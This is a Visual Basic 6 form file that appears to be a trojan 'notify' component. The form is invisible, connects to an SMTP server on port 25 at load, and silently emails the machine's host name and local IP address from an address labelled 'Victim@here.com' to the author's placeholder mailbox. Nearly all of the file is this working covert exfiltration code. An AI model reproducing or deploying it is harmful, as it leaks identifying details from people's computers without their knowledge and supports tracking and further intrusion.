VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "Mswinsck.ocx"
Begin VB.Form frmSendmail 
   Caption         =   "Form1"
   ClientHeight    =   3195
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3195
   ScaleWidth      =   4680
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   2640
      Top             =   960
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1440
      Top             =   1440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   ""
      RemotePort      =   25
   End
   Begin VB.TextBox txtSMTP 
      Height          =   3015
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   0
      Width           =   4575
   End
End
Attribute VB_Name = "frmSendmail"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public x As Integer

Private Sub Form_Load()
Winsock1.RemoteHost = "Put a Host Here"
x = 1
Winsock1.Close
Call Winsock1.Connect
Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
If Winsock1.State = sckConnected Then

Call Sleep(2000)
If x = 1 Then
    Call Winsock1.SendData("Helo" & vbCrLf)
End If
If x = 2 Then
    Call Winsock1.SendData("MAIL" & vbCrLf)
End If
If x = 3 Then
    Call Winsock1.SendData("Mail From:Victim@here.com" & vbCrLf)
End If
If x = 4 Then
    Call Winsock1.SendData("RCPT To:YourEmail@Whereever.com" & vbCrLf)
End If
If x = 5 Then
    Call Winsock1.SendData("DATA" & vbCrLf)
End If
If x = 6 Then
    Call Winsock1.SendData(Winsock1.LocalHostName & " " & Winsock1.LocalIP & vbCrLf)
End If
If x = 7 Then
    Call Winsock1.SendData("." & vbCrLf)
End If
If x = 8 Then
    Call Winsock1.SendData("quit" & vbCrLf)
    Call Winsock1.Close
    Call Winsock1.Close
    Unload Me
    Timer1.Enabled = False
Exit Sub
End If
End If

x = x + 1
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
    Dim data As String
    Call Winsock1.GetData(data)
    txtSMTP.Text = txtSMTP.Text & data & vbCrLf
    
    
End Sub

